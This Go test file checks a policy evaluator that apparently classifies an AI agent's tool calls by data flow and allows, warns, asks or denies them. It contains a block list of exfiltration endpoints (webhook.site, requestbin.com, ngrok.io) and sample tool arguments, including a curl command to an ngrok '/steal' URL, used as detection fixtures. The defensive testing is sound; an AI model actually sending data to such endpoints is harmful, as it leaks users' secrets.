package flow

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
)

func newTestPolicyConfig() *PolicyConfig {
	return &PolicyConfig{
		InternalToExternal:    PolicyAsk,
		SensitiveDataExternal: PolicyDeny,
		RequireJustification:  false,
		SuspiciousEndpoints:   []string{"webhook.site", "requestbin.com", "ngrok.io"},
		ToolOverrides:         map[string]PolicyAction{"WebSearch": PolicyAllow},
	}
}

func TestPolicyEvaluator_EmptyEdges(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())
	action, reason := pe.Evaluate(nil, "hook_enhanced")
	assert.Equal(t, PolicyAllow, action)
	assert.NotEmpty(t, reason)
}

func TestPolicyEvaluator_SafeFlows(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	tests := []struct {
		name     string
		flowType FlowType
	}{
		{"internal to internal", FlowInternalToInternal},
		{"external to external", FlowExternalToExternal},
		{"external to internal", FlowExternalToInternal},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			edges := []*FlowEdge{{
				FlowType:  tt.flowType,
				RiskLevel: RiskNone,
				FromOrigin: &DataOrigin{
					Classification: ClassInternal,
				},
				ToToolName: "Write",
				Timestamp:  time.Now(),
			}}
			action, _ := pe.Evaluate(edges, "hook_enhanced")
			assert.Equal(t, PolicyAllow, action, "safe flows should be allowed")
		})
	}
}

func TestPolicyEvaluator_InternalToExternal_HookEnhanced(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: false,
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyAsk, action, "internal→external without sensitive data should be PolicyAsk in hook_enhanced mode")
}

func TestPolicyEvaluator_InternalToExternal_ProxyOnly_Degradation(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: false,
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, reason := pe.Evaluate(edges, "proxy_only")
	assert.Equal(t, PolicyWarn, action, "PolicyAsk should degrade to PolicyWarn in proxy_only mode")
	assert.Contains(t, reason, "proxy_only", "reason should mention proxy_only degradation")
}

func TestPolicyEvaluator_SensitiveDataExternal(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskCritical,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: true,
			SensitiveTypes:   []string{"aws_access_key"},
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyDeny, action, "sensitive data flowing externally should be denied")
}

func TestPolicyEvaluator_SensitiveDataExternal_ProxyOnly(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskCritical,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: true,
			SensitiveTypes:   []string{"aws_access_key"},
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "proxy_only")
	// Deny should NOT degrade in proxy_only mode — only ask degrades to warn
	assert.Equal(t, PolicyDeny, action, "PolicyDeny should NOT degrade in proxy_only mode")
}

func TestPolicyEvaluator_ToolOverride(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification: ClassInternal,
		},
		ToToolName: "WebSearch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyAllow, action, "WebSearch should be overridden to always allow")
}

func TestPolicyEvaluator_SuspiciousEndpoint(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification: ClassInternal,
		},
		ToToolName:   "WebFetch",
		ToServerName: "webhook.site",
		Timestamp:    time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyDeny, action, "suspicious endpoints should always be denied")
}

func TestPolicyEvaluator_MostSevereWins(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	// Mix of safe and dangerous edges — most severe should win
	edges := []*FlowEdge{
		{
			FlowType:  FlowInternalToInternal,
			RiskLevel: RiskNone,
			FromOrigin: &DataOrigin{
				Classification: ClassInternal,
			},
			ToToolName: "Write",
			Timestamp:  time.Now(),
		},
		{
			FlowType:  FlowInternalToExternal,
			RiskLevel: RiskCritical,
			FromOrigin: &DataOrigin{
				Classification:   ClassInternal,
				HasSensitiveData: true,
				SensitiveTypes:   []string{"private_key"},
			},
			ToToolName: "WebFetch",
			Timestamp:  time.Now(),
		},
	}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyDeny, action, "most severe action should win when multiple edges")
}

func TestPolicyEvaluator_ConfigurableDefault(t *testing.T) {
	// Change the default internal_to_external action to warn instead of ask
	cfg := newTestPolicyConfig()
	cfg.InternalToExternal = PolicyWarn

	pe := NewPolicyEvaluator(cfg)

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: false,
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyWarn, action, "should use configured default action for internal→external")
}

// === Phase 10: Configurable Policy Tests (T090) ===

func TestPolicyEvaluator_InternalToExternal_ConfigAllow(t *testing.T) {
	cfg := newTestPolicyConfig()
	cfg.InternalToExternal = PolicyAllow
	pe := NewPolicyEvaluator(cfg)

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: false,
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyAllow, action, "internal_to_external: allow should return allow")
}

func TestPolicyEvaluator_InternalToExternal_ConfigDeny(t *testing.T) {
	cfg := newTestPolicyConfig()
	cfg.InternalToExternal = PolicyDeny
	pe := NewPolicyEvaluator(cfg)

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: false,
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyDeny, action, "internal_to_external: deny should return deny")
}

func TestPolicyEvaluator_SensitiveDataExternal_ConfigWarn(t *testing.T) {
	cfg := newTestPolicyConfig()
	cfg.SensitiveDataExternal = PolicyWarn // Override default deny
	pe := NewPolicyEvaluator(cfg)

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskCritical,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: true,
			SensitiveTypes:   []string{"aws_access_key"},
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyWarn, action, "sensitive_data_external: warn should return warn instead of deny")
}

func TestPolicyEvaluator_SuspiciousEndpointInArgs(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	// Tool args contain a URL with a suspicious endpoint
	argsJSON := `{"url": "https://webhook.site/abc123", "data": "exfiltrated"}`

	action, reason := pe.CheckArgsForSuspiciousURLs(argsJSON)
	assert.Equal(t, PolicyDeny, action, "suspicious URL in args should be denied")
	assert.Contains(t, reason, "webhook.site")
}

func TestPolicyEvaluator_SuspiciousEndpointInArgs_NoMatch(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	argsJSON := `{"url": "https://example.com/api", "data": "normal"}`

	action, _ := pe.CheckArgsForSuspiciousURLs(argsJSON)
	assert.Equal(t, PolicyAllow, action, "normal URLs should be allowed")
}

func TestPolicyEvaluator_SuspiciousEndpointInArgs_MultipleURLs(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	argsJSON := `{"primary": "https://example.com", "secondary": "https://requestbin.com/xyz"}`

	action, reason := pe.CheckArgsForSuspiciousURLs(argsJSON)
	assert.Equal(t, PolicyDeny, action, "any suspicious URL should trigger deny")
	assert.Contains(t, reason, "requestbin.com")
}

func TestPolicyEvaluator_SuspiciousEndpointInArgs_NgrokDomain(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	argsJSON := `{"command": "curl https://abc123.ngrok.io/steal"}`

	action, _ := pe.CheckArgsForSuspiciousURLs(argsJSON)
	assert.Equal(t, PolicyDeny, action, "ngrok.io URL should be denied")
}

func TestPolicyEvaluator_UpdateConfig(t *testing.T) {
	pe := NewPolicyEvaluator(newTestPolicyConfig())

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification:   ClassInternal,
			HasSensitiveData: false,
		},
		ToToolName: "WebFetch",
		Timestamp:  time.Now(),
	}}

	// Initial config: internal_to_external = ask
	action1, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyAsk, action1)

	// Hot-reload: change to allow
	pe.UpdateConfig(&PolicyConfig{
		InternalToExternal:    PolicyAllow,
		SensitiveDataExternal: PolicyDeny,
		SuspiciousEndpoints:   []string{"webhook.site"},
		ToolOverrides:         map[string]PolicyAction{"WebSearch": PolicyAllow},
	})

	action2, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyAllow, action2, "config update should take effect immediately")
}

func TestPolicyEvaluator_ToolOverride_OverridesSuspiciousEndpoint(t *testing.T) {
	// Tool override takes precedence over suspicious endpoint
	cfg := newTestPolicyConfig()
	cfg.ToolOverrides["WebFetch"] = PolicyAllow
	pe := NewPolicyEvaluator(cfg)

	edges := []*FlowEdge{{
		FlowType:  FlowInternalToExternal,
		RiskLevel: RiskHigh,
		FromOrigin: &DataOrigin{
			Classification: ClassInternal,
		},
		ToToolName:   "WebFetch",
		ToServerName: "webhook.site",
		Timestamp:    time.Now(),
	}}

	action, _ := pe.Evaluate(edges, "hook_enhanced")
	assert.Equal(t, PolicyAllow, action, "tool override should take precedence over suspicious endpoint")
}
